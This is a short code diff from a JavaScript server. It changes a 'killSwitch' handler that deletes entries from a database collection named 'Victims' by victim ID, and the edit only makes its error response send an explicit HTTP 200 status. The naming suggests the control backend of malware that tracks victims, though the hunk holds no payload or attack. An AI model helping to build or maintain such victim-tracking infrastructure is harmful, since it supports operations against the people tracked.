@@ -108,7 +108,7 @@ async function killSwitch(req, res) {
 	const username = req.username;
 
 	if (!username) {
-		return res.send({ status: false, message: "Broken request" });
+		return res.status(200).send({ status: false, message: "Broken request" });
 	} else {
 		try {
 			await mongodb.Victims.deleteOne({ victimId: sanitize(username) }).exec();
